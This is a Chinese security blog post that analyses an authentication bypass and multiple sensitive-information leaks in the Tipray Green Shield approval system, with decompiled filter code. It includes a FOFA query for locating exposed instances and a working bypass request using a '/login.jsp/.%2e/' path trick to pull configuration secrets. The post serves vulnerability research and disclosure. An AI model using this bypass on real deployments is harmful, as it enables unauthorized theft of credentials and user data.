---
title: "天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞"
source: https://mrxn.net/jswz/trwfe-data-leak.html
---

# 天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/9 08:35
* 391浏览
* [0评论](#comment)
* 54分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控，常作为集成在OA系统中的加密软件，用于实现审批流程的自动化和信息化。

该系统的
`getConfigValues.do`
、
`findAuditors.do`
、
`statWxApiRecord.do`
、
`findAllUser.do`
、
`findDeptPage.do`
、
`findAllDept.do`
、
`tdSysFindDepartmentTree.do`
、
`findOnlineUserForPage.do`
、
`/ext/conf/tabledata`
接口存在
[敏感信息泄露](https://mrxn.net/tag/data-leak)
漏洞。未经身份验证的攻击者可以通过访问此接口，获取到系统内部的敏感配置信息或用户数据。

此漏洞可能导致企业内部的用户敏感信息、系统配置参数等重要数据被非法获取，从而对企业的核心业务数据安全造成威胁，增加后续攻击面，甚至可能导致更严重的数据泄露或系统被进一步渗透的风险。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"

# 漏洞分析

## 权限绕过

看下WEB-INF/web.xml中针对
**.do**
结尾的url的处理

```
<filter>
    <filter-name>springSecurityFilterChain</filter-name>
    <filter-class>
       com.trwfe.filter.SecurityFilter
    </filter-class>
    <init-param>
       <param-name>excludedPages</param-name>
       <param-value>user/logon.do</param-value>
    </init-param>
</filter>
<filter-mapping>
    <filter-name>springSecurityFilterChain</filter-name>
    <url-pattern>*.do</url-pattern>
</filter-mapping>
```

所有以
**.do**
结尾的url请求都会经过
`springSecurityFilterChain`
的处理，跟进
`springSecurityFilterChain`
看下它的实现逻辑

```
public class SecurityFilter extends DelegatingFilterProxy {
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;
        String url = request.getRequestURI();
        if (SessionFilter.isNoNeedValidate(url, request)) {
            chain.doFilter(servletRequest, servletResponse);
        } else {
            super.doFilter(request, response, chain);
        }

    }
}
```

`SecurityFilter`
在执行真正的权限校验（
`super.doFilter()`
）之前，会调用
`SessionFilter.isNoNeedValidate()`
方法来检查当前请求的URL是否在“无需认证”的白名单内。如果URL在白名单中，则直接调用
`chain.doFilter()`
，
**跳过**
所有 Spring Security 的认证和授权检查。

其次是看见了我们的老熟人
**String**
**url**
**= request.getRequestURI(); 老生长谈的url鉴权绕过**

再跟进
`SessionFilter.isNoNeedValidate()`
方法看下它的实现

```
public static boolean isNoNeedValidate(String url, HttpServletRequest request) {
    String[] paths = new String[]{"/login.jsp", "/user/logon.do", "/service/", "/menu/getI18N.do", "/menu/getLang.do", "/task/findTaskByIdToDingding.do", "/file/dingApproval.do", "/file/isFileExists.do", "/file/downloadFileTr.do", "/config/findAll.do", "/task/findTaskDing.do", "/task/getUserIdByCode_Ding.do", "/task/getUserMobileToDing.do", "/dept/findDepartmentTree.do", "/file/changeLevel.do", "/tasl/updateParameter.do", "/file/dingdingRelieveApproval.do", "/task/dingFindHistory.do", "/config/findByPk.do", "/task/dispatch.do", "/fanwei/fanweiDispatch.do", "/taskCommon/dispatch.do", "/pages/fanweioa/fanweiApproval.jsp", "/config/findByUserId.do", "/task/ishandle.do", "/file/isDecryptionFileExits.do", "/file/downFileByconfirm.do", "/file/isDensityFileExists.do", "/file/downloadDensityFile.do", "/ding/", "/wx/", "/fanwei/", "/file/editRelieveVal.do", "/task/finddensityConfirmationComments.do", "/file/updateCancelWMVal.do", "/file/updateCancelWMVal.do", "/file/updateCancelWMValSlot.do", "/invoker/findCategoryCombo.do", "/file/downloadFileTrDlp.do", "/file/isFileExistsDlp.do", "/editor/isPreview.do", "/file/downloadEx.do", "/editor/dispatch.do", "/file/getTxtContent.do", "/file/downloadFileExtranet.do", "/file/asyncDownload.do", "/file/getStatus.do", "/file/downloadByUuid.do", "/file/getCompressPackageFileList.do", "/editor/isPreviewByFileName.do", "/file/getCompressPackageFileListByName.do", "/task/validateDdApprover.do", "/task/updateFileOutSendParameter.do", "/task/findNodeChild.do", "/task/fileList.do", "/thirdSystemConfig/getFlowNodeInfo.do", "/task/updateScreenshotParamD.do", "/user/randomCode.do", "/user/showRandomCode.do", "/user/userUnLock.do"};

    for(String path : paths) {
        if (url.startsWith(request.getContextPath() + path)) {
            return true;
        }
    }

    return isDdWxDownLoad(url, request);
}

public static boolean isDdWxDownLoad(String url, HttpServletRequest request) {
    String[] paths = null;
    if (Config.DING_QYWX_DOWNLOAD_FILE) {
        paths = new String[]{"/file/downloadApplyFileNew.do", "/file/fileExistsToDownload.do", "/file/downloadFileDDWx.do"};
    } else {
        paths = new String[0];
    }

    for(String path : paths) {
        if (url.startsWith(request.getContextPath() + path)) {
            return true;
        }
    }

    return false;
}
```

ok，到这里，就可以发现非常明显的权限绕过漏洞了：如果请求的url以上述这些路径开头就会直接绕过鉴权部分直接进入后续的处理流程。

## 信息泄露

### getConfigValues.do

看下
`getConfigValues.do`
的实现部分

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/6a03177f470f4d52a3cd6efa205c9b5f.webp)

直接返回配置信息，因此造成了敏感信息泄露漏洞。

### findAuditors.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/d6b27529d0dd408991ee78f7cb58fff6.webp)

### statWxApiRecord.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/4a47107d6e3e4a8280011d1d5f4eb716.webp)

### findAllUser.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/ae20fc0021c44d83aa55e1c8fe152b5d.webp)

### findDeptPage.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/b8c8580582744b159c53af25065e0425.webp)

### findAllDept.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/b6f4ccf1a06343de84f0a80051846477.webp)

### tdSysFindDepartmentTree.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/1e9d5203046a4e748458706331b1d458.webp)

### findOnlineUserForPage.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/bb91ca10652d4ac687f1aab2778124db.webp)

### /ext/conf/tabledata

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/c2c4dc44f9ce405188ee8b506c8e05bd.webp)

APPROVAL\_TABLE\_NAME定义如下

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/dc5a81d61a074dd3ae1dd15d8ce5b2b6.webp)

对应的 WEB-INF/classes/pack.properties 配置如下

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/af3b90ac068c4571b98895d9fe1efc5c.webp)

对应的 mapper 如下

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/a158f80020924a309fc7cdd037caa3d2.webp)

### /ext/fileServer

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/4678c26417af461ca43173cd38c1e5ba.webp)

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/b07b9bf6d14b460fbf9e23a40468a749.webp)

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/271f1863d05240cea01371cac3e3b285.webp)

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/2cce11f03a394e77ab2e69efb15cf58f.webp)

### /ext/fileServer/upload

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/9df14c2d6435413193f55000b3887b9b.webp)

分析同上

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/f45e83cd3e514cf4a66bce8cdf6f51a9.webp)

# 漏洞复现

## getConfigValues.do

> 需要POST请求

```
POST /trwfe/login.jsp/.%2e/config/getConfigValues.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded
```

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/e0b1f85338a0460e80d846580c3427e2.webp)

成功得到系统配置信息，如微信的corpid、corpsecret和mi.secret以及hw.secret等
[敏感配置信息](https://mrxn.net/tag/data-leak)
。

## findAuditors.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/fc6a3ac7df5c4e3db7bc1afa81d29d21.webp)

## statWxApiRecord.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/81cd56c220784387bf0f60362d16ec12.webp)

## findAllUser.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/8ab4b1116dda44cfa28abf33a7c69118.webp)

## findDeptPage.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/45154f3ef3bc476fb6596b34a0d4d1f5.webp)

## findAllDept.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/421432050fc04bd7b3f3eb584db8d616.webp)

## tdSysFindDepartmentTree.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/be4cd9ef5206489a824949474df590e2.webp)

## findOnlineUserForPage.do

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/f42451d3ecae4a60af654f5c75a6d543.webp)

## /ext/conf/tabledata

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/aa5cd8ce91184d1084c4950d78b74b53.webp)

通过不存在的表导致sql报错，
[泄露](https://mrxn.net/tag/data-leak)
系统物理路径

## /ext/fileServer

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/d12a26fbe9744f42a37355dcc6b069bd.webp)

泄露文件传输的端口以及密码

![天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://image.mrxn.net/5a9e230cef9641abb514a8105f7e839b.webp)

## /ext/fileServer/upload

同上

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  data-leak](https://mrxn.net/tag/data-leak)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[天锐绿盾审批系统 getConfigValues.do、findAuditors.do、statWxApiRecord.do、findAllUser.do、findDeptPage.do、findAllDept.do、tdSysFindDepartmentTree.do、findOnlineUserForPage.do、/ext/conf/tabledata 敏感信息泄露漏洞](https://mrxn.net/jswz/trwfe-data-leak.html)
  
文章链接：
<https://mrxn.net/jswz/trwfe-data-leak.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});